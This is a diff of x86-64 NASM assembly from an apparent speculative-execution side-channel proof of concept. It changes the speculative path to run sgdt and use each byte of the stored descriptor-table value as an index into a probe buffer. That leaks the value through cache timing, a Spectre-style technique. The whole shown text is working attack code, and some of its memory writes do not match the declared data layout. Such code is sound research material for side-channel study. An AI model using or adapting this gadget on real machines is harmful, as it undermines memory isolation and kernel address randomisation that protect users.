@@ -19,6 +19,9 @@ SECTION .data
     ;Timings array
     timings         TIMES 256           dd 0
 
+    gdt_base        dq 0
+    gdt_limit       dw 0
+
 SECTION .code
 
     ;\ /\ /\ /                                                         \ /\ /\ /
@@ -107,8 +110,10 @@ SECTION .code
 
         ;Prepare some reg and touch some line to make the speculative path feasable
         lea rsi, [buffer]
-        movzx eax, BYTE [gdt_base]
-        lfence
+        lea rcx, [gdt_base]
+        mov DWORD [rcx], 0
+        mov DWORD [rcx+8], 0
+        sfence
 
         ;Specpoline
         lea rax, [leak.profile]
@@ -118,8 +123,11 @@ SECTION .code
         ; o o o SPECULATIVE PATH
         ;0.0 O
 
-        mov rbx, cr3
-        mov ebx, DWORD [rsi]
+        ;mov ebx, DWORD [rsi + 64*GAP*0]
+        sgdt [rcx]
+        movzx rcx, BYTE [rcx+rdi]       
+        shl rcx, 6 + GAP_SHIFT
+        mov ebx, DWORD [rsi+rcx]
 
         ud2                             ;Stop speculation
 
